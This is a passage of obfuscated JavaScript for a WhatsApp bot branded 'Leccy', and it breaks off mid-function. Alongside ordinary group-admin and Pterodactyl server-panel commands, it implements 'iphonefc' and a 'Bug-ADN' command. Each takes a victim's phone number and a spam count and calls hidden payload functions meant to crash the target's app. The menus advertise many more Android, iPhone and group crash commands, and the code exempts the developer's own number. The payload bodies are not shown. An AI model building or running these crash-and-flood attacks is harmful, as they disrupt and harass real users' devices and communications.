          meluatke = target_orang.replace(/[^0-9]/g, '');
          let _0x27266e = await _0x4e2417.onWhatsApp(meluatke + "@s.whatsapp.net");
          if (_0x27266e.length == 0x0) {
            return _0x385943("*The number is not registered in the WhatsApp application.*");
          }
          if (meluatke == global.devNumber.includes) {
            return;
          }
          if (meluatke == "6285807405071") {
            return;
          }
          if (meluatke == '6285807405071') {
            return;
          }
          let _0x59e3bb = meluatke + "@s.whatsapp.net";
          jumlah = encodeURI(jumla_spamm) * 0x5;
          _0x385943("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x26c63e("*Succesfully Send Bug-ADN To @" + _0x59e3bb.split('@')[0x0] + ", With The Amount Of Spam " + jumlah + '*', [_0x59e3bb]);
          await sleep(0x3e8);
          _0x48df22(_0x59e3bb, jumlah);
        }
        break;
      case "iphonefc":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
            return;
          }
          if (!q) {
            return _0x385943("*Format :*\n" + (_0x5cf8f7 + _0x55733f) + " 628xxxx,1");
          }
          target_orang = q.split(',')[0x0];
          jumla_spamm = q.split(',')[0x1] ? q.split(',')[0x1] : '2';
          if (isNaN(parseInt(jumla_spamm))) {
            return _0x385943("Jumlah wajib angka!!");
          }
          meluatke = target_orang.replace(/[^0-9]/g, '');
          let _0x517fa0 = await _0x4e2417.onWhatsApp(meluatke + "@s.whatsapp.net");
          if (_0x517fa0.length == 0x0) {
            return _0x385943("*The number is not registered in the WhatsApp application.*");
          }
          if (meluatke == global.devNumber.includes) {
            return;
          }
          if (meluatke == "6285807405071") {
            return;
          }
          if (meluatke == '6285807405071') {
            return;
          }
          let _0xb2f5ae = meluatke + "@s.whatsapp.net";
          jumlah = encodeURI(jumla_spamm) * 0xa;
          _0x385943("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x26c63e("*Succesfully Send Bug-IOS To @" + _0xb2f5ae.split('@')[0x0] + ", With The Amount Of Spam " + jumlah + '*', [_0xb2f5ae]);
          await sleep(0x3e8);
          _0x4eba09(_0xb2f5ae, jumlah);
        }
        break;
      case 'block':
        if (!_0x107eff) {
          return _0x385943("*Khusus Owner Leccy!*");
        }
        blockw = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x440f2b = await _0x4e2417.onWhatsApp(blockw + '@s.whatsapp.net');
        if (_0x440f2b.length == 0x0) {
          return _0x385943("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x4e7582 = blockw + '@s.whatsapp.net';
        await _0x4e2417.updateBlockStatus(_0x4e7582, 'block').then(_0x264f0b => _0x385943(JSON.stringify(_0x264f0b, null, 0x2)))["catch"](_0x23cf45 => _0x385943(JSON.stringify(_0x23cf45, null, 0x2)));
        break;
      case "unblock":
        if (!_0x107eff) {
          return _0x385943("*Khusus Owner Leccy!*");
        }
        blockww = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x2c186e = await _0x4e2417.onWhatsApp(blockww + '@s.whatsapp.net');
        if (_0x2c186e.length == 0x0) {
          return _0x385943("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x537fda = blockww + "@s.whatsapp.net";
        await _0x4e2417.updateBlockStatus(_0x537fda, "unblock").then(_0xa0d139 => _0x385943(JSON.stringify(_0xa0d139, null, 0x2)))['catch'](_0x111aaf => _0x385943(JSON.stringify(_0x111aaf, null, 0x2)));
        break;
      case 'leave':
        if (!_0x107eff) {
          return _0x385943("*Khusus Owner Leccy!*");
        }
        if (!_0x41589b) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        _0x385943("Bye Everyone.");
        await _0x4e2417.groupLeave(_0x477074);
        break;
      case "restart":
      case "shutdown":
        if (!_0x107eff) {
          return _0x385943("*Khusus Owner Leccy!*");
        }
        _0x385943('Goodbye🖐');
        await sleep(0xbb8);
        process.exit();
        break;
      case "menu":
        {
          mark = "0@s.whatsapp.net";
          listmenuBot = "▭▬▭▬▭▬▭▬▭▬▭▬▭\nBotname : *" + global.botName + "*\nOwners : *" + global.ownerName + "*\nPengguna : *" + (_0x254696 ? "VIP" : "VVIP") + "*\nNumber : @" + _0x170bf2.split('@')[0x0] + "\nPrefix : *MULTI*\n▭▬▭▬▭▬▭▬▭▬▭▬\n*===( LIST-MENU )=====*\njadibotmenu\nownermenu\ngroupmenu\nmurbugmenu\ncpanelmenu\nsoundmenu\n▭▬▭▬▭▬▭▬▭▬▭▬\n*===( BUG-MENU )=====*\nbuginfinity\nbugemoji\nbuggroup\nbugiphone\nbugandroid\n▭▬▭▬▭▬▭▬▭▬▭▬\n_*CREDITS © LECCYOFC*_\n*POWERED BY @" + mark.split('@')[0x0] + '*';
          _0x317514(listmenuBot, [_0x170bf2, mark]);
        }
        break;
      case "buginfinity":
      case 'bugandroid':
      case "bugemoji":
      case 'buggroup':
      case "bugiphone":
      case "murbugmenu":
      case "jadibotmenu":
      case "ownermenu":
      case "groupmenu":
      case 'cpanelmenu':
      case "soundmenu":
        {
          txt_bugandro = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG ANDROID*\n.sendbug 628XXXX\n.infinity 628XXXX\n.gaslec 628XXXX\n.xforce 628XXXX\n.santet 628XXXX\n.trolifc 628XXXX\n.travas 628XXXX\n.docgas 628XXXX\n.crashfc 628XXXX\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_buginfinity = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG CRASH-INFINITY*\n.iphonefc 628XXXX,10\n.androidfc 628XXXX,10\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_bugemoji = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG ANDROID*\n\n*XNUMBER*\n🥀 628XXXXX\n🍁 628XXXXX\n🐉 628XXXXX\n🍒 628XXXXX\n🌷 628XXXXX\n\n*MJSPAM*\n🌹 <amount>\n🐲 <amount>\n🔥 <amount>\n🦖 <amount>\n🦕 <amount>\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_bugiphone = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG IPHONE*\n.killip 628XXXX\n.bomip 628XXXX\n.travass 628XXXX\n.crashin 628XXXX\n.homeip 628XXXX\n.blankip 628XXXX\n.craship 628XXXX\n.gas_ip 628XXXX\n.docip 628XXXX\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_buggroup = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG GROUP*\n.wargc *linkgrup*\n.xlecgc *linkgrup*\n.buggc *linkgrup*\n.crashgc *linkgrup*\n.bomgc *linkgrup*\n.travagc *linkgrup*\n.virdokgc *linkgrup*\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_murbug = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*MURBUG MENU*\n.listown\n.addown\n.delown\n.addprem\n.delprem\n.listprem\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_jadibot = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*JADIBOT MENU*\n.jadibot\n.stopjadibot\n.del-sesi\n.resetjadibot\n.listjadibot\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_owner = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*OWNER MENU*\n.join\n.restart\n.leave\n.unblock\n.block\n.shutdown\n.unmute\n.mute\n.runtime\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_group = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*GROUP MENU*\n.kick\n.open\n.close\n.linkgc\n.linkgrup\n.revoke\n.hidetag\n.promote\n.demote\n.setname\n.setdesc\n.editinfo\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_cpanel = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*CPANEL MENU*\n.listapi\n.addapi\n.delusr\n.detusr\n.listusr\n.addusr\n.listsrv\n.detsrv\n.delsrv\n.addsrv\n.bansrv\n.unbansrv\n.reinstall\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_sound = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*SOUND MENU*\n.sound1\n.sound2\n.sound3\n.sound4\n.sound5\n.sound6\n.sound7\n.sound8\n.sound9\n.sound10\n.sound11\n.sound12\n.sound13\n.sound14\n.sound15\n.sound16\n.sound17\n.sound18\n.sound19\n.sound20\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          if (_0x55733f == 'bugandroid') {
            _0x317514(txt_bugandro, [_0x170bf2]);
          } else {
            if (_0x55733f == 'buginfinity') {
              _0x317514(txt_buginfinity, [_0x170bf2]);
            } else {
              if (_0x55733f == "bugemoji") {
                _0x317514(txt_bugemoji, [_0x170bf2]);
              } else {
                if (_0x55733f == "bugiphone") {
                  _0x317514(txt_bugiphone, [_0x170bf2]);
                } else {
                  if (_0x55733f == "buggroup") {
                    _0x317514(txt_buggroup, [_0x170bf2]);
                  } else {
                    if (_0x55733f == "murbugmenu") {
                      _0x317514(txt_murbug, [_0x170bf2]);
                    } else {
                      if (_0x55733f == "jadibotmenu") {
                        _0x317514(txt_jadibot, [_0x170bf2]);
                      } else {
                        if (_0x55733f == "ownermenu") {
                          _0x317514(txt_owner, [_0x170bf2]);
                        } else {
                          if (_0x55733f == "groupmenu") {
                            _0x317514(txt_group, [_0x170bf2]);
                          } else {
                            if (_0x55733f == "cpanelmenu") {
                              _0x317514(txt_cpanel, [_0x170bf2]);
                            } else if (_0x55733f == 'soundmenu') {
                              _0x317514(txt_sound, [_0x170bf2]);
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        break;
      case "join":
        if (_0x315745.key.fromMe) {
          return;
        }
        if (!_0x107eff) {
          return _0x385943("This feature can only be used by the owner Bot");
        }
        if (!q) {
          return _0x385943("Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx");
        }
        if (!_0x212998[0x0].includes("whatsapp.com")) {
          return _0x385943("Link Invalid!");
        }
        resjoin = _0x212998[0x0].split('https://chat.whatsapp.com/')[0x1];
        try {
          join = await _0x4e2417.groupAcceptInvite(resjoin);
          _0x385943(join);
        } catch (_0x304b7a) {
          _0x385943(util.format(_0x304b7a));
        }
        break;
      case "linkgrup":
      case "linkgc":
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xba057a) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          url_ = await _0x4e2417.groupInviteCode(_0x477074);
          yurl = "https://chat.whatsapp.com/" + url_;
          _0x385943(yurl);
        }
        break;
      case "open":
        if (!_0x41589b) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x4dbbb6 && !_0x107eff) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xba057a) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x4e2417.groupSettingUpdate(_0x477074, 'not_announcement');
        _0x385943("*OPENED* The group is opened by admin\nNow members can send messages");
        break;
      case "close":
        if (!_0x41589b) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x4dbbb6 && !_0x107eff) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xba057a) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x4e2417.groupSettingUpdate(_0x477074, 'announcement');
        _0x385943("*CLOSED* group closed by admin\nnow only admin can send messages");
        break;
      case "revoke":
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xba057a) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          await _0x4e2417.groupRevokeInvite(_0x477074).then(_0x32ffe9 => _0x385943(JSON.stringify(_0x32ffe9, null, 0x2)))["catch"](_0x34e9d1 => _0x385943(JSON.stringify(_0x34e9d1, null, 0x2)));
        }
        break;
      case "kick":
        if (!_0x41589b) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x4dbbb6 && !_0x107eff) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xba057a) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x315745.message.extendedTextMessage === undefined || _0x315745.message.extendedTextMessage === null) {
          return _0x385943("Reply targetnya!");
        }
        _0x385943("Sampah Grup Berhasil di Keluarkan!");
        remove = _0x315745.message.extendedTextMessage.contextInfo.participant;
        await _0x4e2417.groupParticipantsUpdate(_0x477074, [remove], "remove");
        break;
      case "hidetag":
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          let _0x2de4ca = [];
          _0x4feebe.map(_0x10a3b4 => _0x2de4ca.push(_0x10a3b4.id));
          _0x4e2417.sendMessage(_0x477074, {
            'text': q ? q : '',
            'mentions': _0x2de4ca
          });
        }
        break;
      case "promote":
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xba057a) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x315745.message.extendedTextMessage === undefined || _0x315745.message.extendedTextMessage === null) {
            return _0x385943("Reply targetnya!");
          }
          promote = _0x315745.message.extendedTextMessage.contextInfo.participant;
          await _0x4e2417.groupParticipantsUpdate(_0x477074, [promote], 'promote').then(_0x3c755e => _0x385943(JSON.stringify(_0x3c755e, null, 0x2)))["catch"](_0x4a5d59 => _0x385943(JSON.stringify(_0x4a5d59, null, 0x2)));
        }
        break;
      case "demote":
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xba057a) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x315745.message.extendedTextMessage === undefined || _0x315745.message.extendedTextMessage === null) {
            return _0x385943("Reply targetnya!");
          }
          demote = _0x315745.message.extendedTextMessage.contextInfo.participant;
          await _0x4e2417.groupParticipantsUpdate(_0x477074, [demote], "demote").then(_0x144dc7 => _0x385943(JSON.stringify(_0x144dc7, null, 0x2)))["catch"](_0x1ea0f5 => _0x385943(JSON.stringify(_0x1ea0f5, null, 0x2)));
        }
        break;
      case "setname":
      case 'setsubject':
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xba057a) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x385943("Nama Group Nya Mana?\n\nEx:\n.setname nama_group");
          }
          await _0x4e2417.groupUpdateSubject(_0x477074, q).then(_0x49a8c2 => _0x385943(JSON.stringify(_0x49a8c2, null, 0x2)))["catch"](_0x1b324f => _0x385943(JSON.stringify(_0x1b324f, null, 0x2)));
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!_0x41589b) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x4dbbb6 && !_0x107eff) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xba057a) {
            return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x385943("Teks Deskripsi Nya Mana?\n\nEx:\n.setdesc teks_deskripsi");
          }
          await _0x4e2417.groupUpdateDescription(_0x477074, q).then(_0x32128c => _0x385943(JSON.stringify(_0x32128c, null, 0x2)))['catch'](_0x14eb98 => _0x385943(JSON.stringify(_0x14eb98, null, 0x2)));
        }
        break;
      case "editinfo":
        if (!_0x41589b) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0x4dbbb6 && !_0x107eff) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xba057a) {
          return _0x385943("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x212998[0x0] === "open") {
          await _0x4e2417.groupSettingUpdate(_0x477074, 'unlocked').then(_0x29d264 => _0x385943("Successfully Opened Group Edit Info"))['catch'](_0x339ffb => _0x385943(JSON.stringify(_0x339ffb, null, 0x2)));
        } else if (_0x212998[0x0] === "close") {
          await _0x4e2417.groupSettingUpdate(_0x477074, "locked").then(_0x1e7c45 => _0x385943("Successfully Closed Group Edit Info"))["catch"](_0xb06d33 => _0x385943(JSON.stringify(_0xb06d33, null, 0x2)));
        } else {
          _0x385943("*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin group yang bisa edit deskripsi_*\n\n*Example:*\n" + (_0x5cf8f7 + _0x55733f) + " close");
        }
        break;
      case "listapi":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x27f63f = await fetch(global.domain + '/api/client/account/api-keys', {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_pltc
            }
          });
          let _0x76f71d = await _0x27f63f.json();
          if (_0x76f71d.errors) {
            return _0x385943(util.format(_0x76f71d.errors[0x0]));
          }
          _0x385943(util.format(_0x76f71d.data));
        }
        break;
      case "addapi":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x55f6c8 = q ? q : _0x230bcf(0x5);
          let _0x5b31a1 = await fetch(global.domain + "/api/client/account/api-keys", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_pltc
            },
            'body': JSON.stringify({
              'description': _0x55f6c8,
              'allowed_ips': []
            })
          });
          let _0x46e532 = await _0x5b31a1.json();
          _0x385943(util.format(_0x46e532));
          if (_0x46e532.errors) {
            return _0x385943(util.format(_0x46e532.errors[0x0]));
          }
        }
        break;
      case "addusr":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0xeabd29 = q.split(',')[0x0] || _0x170bf2.split('@')[0x0];
          let _0x25db6d = q.split(',')[0x1];
          if (!_0x25db6d) {
            return _0x385943("*FORMAT ADDUSR*:\n.addusr 628xxxx,leccy");
          }
          userku = _0xeabd29.replace(/[^0-9]/g, '');
          let _0x8ff2c9 = await _0x4e2417.onWhatsApp(userku + "@s.whatsapp.net");
          if (_0x8ff2c9.length == 0x0) {
            return _0x385943("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          let _0x3d7d0c = '' + _0x25db6d + _0x230bcf(0x3);
          let _0x4da219 = userku + "@s.whatsapp.net";
          let _0x27f2f8 = await fetch(global.domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + global.key_plta
            },
            'body': JSON.stringify({
              'email': _0x25db6d + '@buyer.id',
              'username': _0x25db6d,
              'first_name': _0x25db6d,
              'last_name': "Users",
              'language': 'en',
              'password': _0x3d7d0c
            })
          });
          let _0x2a6e36 = await _0x27f2f8.json();
          if (_0x2a6e36.errors) {
            return _0x385943(_0x2a6e36.errors[0x0].detail);
          }
          let _0x4cf200 = _0x2a6e36.attributes;
          _0x385943(_0x4cf200.username + ',,' + _0x4cf200.id + ',ram/disk,cpu');
          _0x26c63e("𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟\n\nID: " + _0x4cf200.id + "\nTYPE: " + _0x2a6e36.object + "\nUSERNAME: " + _0x4cf200.username + "\nEMAIL: " + _0x4cf200.email + "\nNAME: " + _0x4cf200.first_name + " " + _0x4cf200.last_name + "\nLANGUAGE: " + _0x4cf200.language + "\nADMIN: " + _0x4cf200.root_admin + "\nCREATED AT: \n" + _0x4cf200.created_at + "\n\n*SEND ACCOUNT* @" + _0x4da219.split('@')[0x0], [_0x4da219]);
        }
        break;
      case "delusr":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          if (!q) {
            return _0x385943("ID nya mana?");
          }
          let _0x4a3d23 = await fetch(global.domain + "/api/application/users/" + q, {
            'method': "DELETE",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x4e6e0d = await _0x4a3d23.json();
          if (_0x4e6e0d.errors) {
            return _0x385943(util.format(_0x4e6e0d.errors[0x0]));
          }
          _0x385943("*SUKSES DELETE USER " + q + '*');
        }
        break;
      case 'detusr':
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x56d2c4 = _0x212998[0x0];
          let _0x11ba19 = await fetch(global.domain + "/api/application/users/" + _0x56d2c4, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x38eb99 = await _0x11ba19.json();
          if (_0x38eb99.errors) {
            return _0x385943(util.format(_0x38eb99.errors[0x0]));
          }
          let _0x47c95b = _0x38eb99.attributes;
          let _0x573816 = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n" + _0x47c95b.username.toUpperCase() + " USER DETAILS\n\nID: " + _0x47c95b.id + "\nUSERNAME: " + _0x47c95b.username + "\nLANGUAGE: " + _0x47c95b.language + "\nADMIN: " + _0x47c95b.root_admin + "\nEMAIL: " + _0x47c95b.email + "\nCREATED AT: \n " + _0x47c95b.created_at + "\n▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0x385943(_0x573816);
        }
        break;
      case "listusr":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x7bce9f = q ? q : '1';
          let _0x203563 = await fetch(global.domain + '/api/application/users?page=' + _0x7bce9f, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x12b5a0 = await _0x203563.json();
          if (_0x12b5a0.errors) {
            return _0x385943(util.format(_0x12b5a0.errors[0x0]));
          }
          let _0x1cb3f6 = _0x12b5a0.data;
          let _0x46ecc8 = [];
          for (let _0xdfdff of _0x1cb3f6) {
            let _0x58c52b = _0xdfdff.attributes;
            let _0x4bdc4a = {
              'id': _0x58c52b.id,
              'username': _0x58c52b.username,
              'email': _0x58c52b.email,
              'language': _0x58c52b.language,
              'root_admin': _0x58c52b.root_admin
            };
            await _0x46ecc8.push(_0x4bdc4a);
          }
          _0x41f71b(util.format(_0x46ecc8));
        }
        break;
      case 'addsrv':
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x28782d = q.split(',');
          if (_0x28782d.length < 0x5) {
            return _0x385943('username,deskripsi,userID,ram/disk,cpu');
          }
          let _0x45fab5 = _0x28782d[0x0];
          let _0x57f94a = _0x28782d[0x1] || "© BUYER LECCY || SERVER OVERHEAT DELETE ACCOUNT✅";
          let _0x33b1cd = _0x28782d[0x2];
          let _0x5d05d1 = _0x28782d[0x3].split`/`;
          let _0x3631a1 = _0x28782d[0x4];
          let _0x19a454 = global.eggID;
          let _0x2d59a4 = global.locID;
          let _0x5a3ba6 = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            },
            'body': JSON.stringify({
              'name': _0x45fab5,
              'description': _0x57f94a,
              'user': _0x33b1cd,
              'egg': parseInt(_0x19a454),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_21",
              'startup': "${CMD_RUN}",
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': _0x5d05d1[0x0],
                'swap': 0x0,
                'disk': _0x5d05d1[0x1],
                'io': 0x1f4,
                'cpu': _0x3631a1
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x2d59a4)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x58b92e = await _0x5a3ba6.json();
          if (_0x58b92e.errors) {
            return _0x385943(util.format(_0x58b92e.errors[0x0]));
          }
          let _0x48dcd3 = _0x58b92e.attributes;
          let _0x33c77a = "𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗦𝗘𝗥𝗩𝗘𝗥\n\nID: " + _0x48dcd3.id + "\nTYPE: " + _0x58b92e.object + "\nNAME: " + _0x48dcd3.name + "\nMEMORY: " + (_0x48dcd3.limits.memory === 0x0 ? "unlimited" : _0x48dcd3.limits.memory) + " MB\nDISK: " + (_0x48dcd3.limits.disk === 0x0 ? 'unlimited' : _0x48dcd3.limits.disk) + " MB\nCPU: " + (_0x48dcd3.limits.cpu === 0x0 ? "unlimited" : _0x48dcd3.limits.cpu) + "%\nEXPIRED: 1 BULAN\nDESCRIPTION: " + _0x48dcd3.description + "\nCREATED AT: \n" + _0x48dcd3.created_at + "\n";
          _0x41f71b(_0x33c77a);
        }
        break;
      case "delsrv":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          if (!q) {
            return _0x385943("Server nomor berapa yang mau di hapus?\nContoh: delsrv 1");
          }
          let _0x4bf0f4 = await fetch(global.domain + "/api/application/servers/" + q, {
            'method': 'DELETE',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x1a5146 = await _0x4bf0f4.json();
          if (_0x1a5146.errors) {
            return _0x385943(util.format(_0x1a5146.errors[0x0]));
          }
          _0x385943("SUKSES DELETE SERVER " + q);
        }
        break;
      case 'reinstall':
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          if (!q) {
            return _0x385943("ID nya mana?");
          }
          let _0x1c617d = await fetch(global.domain + "/api/application/servers/" + q + "/reinstall", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x33d7b1 = await _0x1c617d.json();
          if (_0x33d7b1.errors) {
            return _0x385943(util.format(_0x33d7b1.errors[0x0]));
          }
          _0x385943("*SUKSES REINSTALL SERVER " + q + '*');
        }
        break;
      case 'bansrv':
        {
          if (!_0x107eff) {
            return _0x385943("Maaf This feature can only be used by the owner Lexxy");
          }
          if (!q) {
            return _0x385943("ID nya mana?");
          }
          let _0x2b07d0 = await fetch(global.domain + "/api/application/servers/" + q + '/suspend', {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x4d06ba = await _0x2b07d0.json();
          if (_0x4d06ba.errors) {
            return _0x385943(util.format(_0x4d06ba.errors[0x0]));
          }
          _0x385943("*SUKSES BANNED SERVER " + q + '*');
        }
        break;
      case "unbansrv":
        {
          if (!_0x107eff) {
            return _0x385943("Maaf This feature can only be used by the owner Lexxy");
          }
          let _0x17bbf9 = _0x212998[0x0];
          if (!_0x17bbf9) {
            return _0x385943("ID nya mana?");
          }
          let _0x4a0d83 = await fetch(global.domain + "/api/application/servers/" + _0x17bbf9 + "/unsuspend", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x56405d = await _0x4a0d83.json();
          if (_0x56405d.errors) {
            return _0x385943(util.format(_0x56405d.errors[0x0]));
          }
          _0x385943("*SUKSES UNBAND SERVER " + _0x17bbf9 + '*');
        }
        break;
      case 'detsrv':
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x27e298 = await fetch(global.domain + "/api/application/servers/" + q, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + global.key_plta
